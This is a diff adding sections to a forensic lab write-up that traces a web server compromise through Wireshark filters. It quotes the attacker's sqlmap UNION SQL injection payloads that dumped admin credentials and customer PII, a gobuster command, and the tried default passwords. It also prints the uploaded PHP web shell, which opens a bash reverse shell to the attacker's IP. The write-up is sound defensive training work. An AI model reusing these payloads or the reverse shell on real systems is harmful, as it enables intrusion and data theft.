@@ -402,6 +402,7 @@ ip.addr == 111.224.250.131 && http.user_agent contains "sqlmap" && http.request.
 Following from previous question, not only exfiltrated database information, we identified other malicious activities.
 
 - **Exfiltrated adminitrator information from database `bookwork_db` included id, username and password**
+  
 ```sql
 GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
 ```
@@ -413,6 +414,7 @@ ip.addr == 111.224.250.131 && http.user_agent contains "sqlmap" && http.request.
 ![pic14](assets/images/cyberdefender/webinvestigation/pic14.png)
 
 - **Exfiltrated sensitive data from clients from database `bookwork_db` included their PIIs**
+  
 ```sql
 GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,address,email,first_name,id,last_name,phone)),0x7176706a71) FROM bookworld_db.customers-- - HTTP/1.1 
 ```
@@ -424,15 +426,105 @@ Wireshark filter indicating adversary successfully exfiltrated customer's PII fr
 
 #### Q7: The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. Can you provide the name of the directory discovered by the attacker?
 
+Beside exploiting compromised server by SQL injection, we also obverserved the use of [Gobuster](https://github.com/OJ/gobuster) - a well-known tool for directory / file brute forcing (We indicated it by inspect User-Agent strings).
+
+So not only exfiltrated sensitive data from database, the adversary was try to scan the compromised server to identify hidden directories on the web server.
+
+As you know, or maybe not, to use Gobuster, user must have a list of pre-defined directories, files, etc, below is one of basic Gobuster's command use to enumerate web server:
+```bash
+gobuster dir -u https://example.com -w /path/to/wordlist.txt
+```
+
+Base on `wordlist.txt`, it might contains hundreds, thounsands or maybe....zillions of entries, so it's not efficient to filter user-agent strings contains `gobuster` and find out which one is the right answer, because it definitely gonna be a tedieous work, instead, we would like to filter ONLY HTTP REPONSE CODE 302 between IP addresses of the web server and the adversary and inspect application field to indicate which hidden path has been discovered.
+
+```sql
+ip.src == 73.124.22.98 and ip.dst == 111.224.250.131 and http.response.code == 302
+```
+We did a great job, our filter hit 2 events !
+
+![pic16](assets/images/cyberdefender/webinvestigation/pic16.png)
+
+Also, there's a worthnothy event, adversary found the login page (`/admin/login.php`) for administrator - 5 minutes after he/shes found hidden path `/admin/`. 
+
+![pic17](assets/images/cyberdefender/webinvestigation/pic17.png)
+
 > ANSWER: `/admin/`
 {: .prompt-info } 
 
 #### Q8: Knowing which credentials were used allows us to determine the extent of account compromise. What are the credentials used by the attacker for logging in?
 
+By correlate previous question and question number 6, we knew adversary might used exfiltrated admin information from `bookwork_db.`
+
+```sql
+GET /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,id,password,username)),0x7176706a71) FROM bookworld_db.`admin`-- - HTTP/1.1 
+```
+
+And use this credential to login into Administrator page. To hunting which credential has been used, we could extract information from traffic flow (Adversary -> Server) and their interaction with the discovered hidden path.
+
+```sql
+ip.dst == 73.124.22.98 and ip.src == 111.224.250.131 and frame contains "/admin/login.php" and http.request.method == POST
+```
+
+![pic18](assets/images/cyberdefender/webinvestigation/pic18.png)
+
+`HTML Form URL Encoded` field contains credential information, but there were 4 set of user:password has been used by the adversary:
+- `admin`:`admin`
+- `admin`:`changeme`
+- `default`:`default`
+- `admin`:`admin123!`'
+
+Which one is the correct credential ? We could extract those information by finding associate response from compromised webserver. 
+
+```sql
+frame contains "/admin/" and http.request.method == POST || http.response.code == 200 || http.response.code == 302
+```
+
+![pic19](assets/images/cyberdefender/webinvestigation/pic19.png)
+
 > ANSWER: `admin:admin123!`
 {: .prompt-info }
 
 #### Q9: We need to determine if the attacker gained further access or control of our web server. What's the name of the malicious script uploaded by the attacker?
+
+By identified adversary's TTPs, which is using valid account to login into admininistrator web page (`index.php`), we could investigate further their activities on the web page by look into their requests.
+
+```sql
+ip.src ==  111.224.250.131 and http.request.method == POST and frame contains "index.php"
+```
+![pic20](assets/images/cyberdefender/webinvestigation/pic20.png)
+
+1 event associated with above filter, we identified adversary uploaded a file name `NVri2vhp.php`:
+
+```bash
+Frame 88757: 1122 bytes on wire (8976 bits), 1122 bytes captured (8976 bits)
+Ethernet II, Src: VMware_c0:00:0a (00:50:56:c0:00:0a), Dst: VMware_6c:76:5f (00:0c:29:6c:76:5f)
+Internet Protocol Version 4, Src: 111.224.250.131, Dst: 73.124.22.98
+Transmission Control Protocol, Src Port: 50076, Dst Port: 80, Seq: 1, Ack: 1, Len: 1056
+Hypertext Transfer Protocol
+MIME Multipart Media Encapsulation, Type: multipart/form-data, Boundary: "---------------------------356779360015075940041229236053"
+    [Type: multipart/form-data]
+    First boundary: -----------------------------356779360015075940041229236053\r\n
+    Encapsulated multipart part:  (application/x-php)
+        Content-Disposition: form-data; name="fileToUpload"; filename="NVri2vhp.php"\r\n
+        Content-Type: application/x-php\r\n\r\n
+        Media Type
+            Media type: application/x-php (79 bytes)
+    Boundary: \r\n-----------------------------356779360015075940041229236053\r\n
+    Encapsulated multipart part: 
+        Content-Disposition: form-data; name="submit"\r\n\r\n
+        Data (11 bytes)
+            Data: 55706c6f61642046696c65
+            [Length: 11]
+    Last boundary: \r\n-----------------------------356779360015075940041229236053--\r\n
+```
+
+Even more interesting, inspect HEX / ASCII panel, the file uploaded by adversary was a TCP reverse shell.
+
+![pic21](assets/images/cyberdefender/webinvestigation/pic21.png)
+
+```bash
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/"111.224.250.131"/443 0>&1'");?>
+```
 
 > ANSWER: `NVri2vhp.php`
 {: .prompt-info }
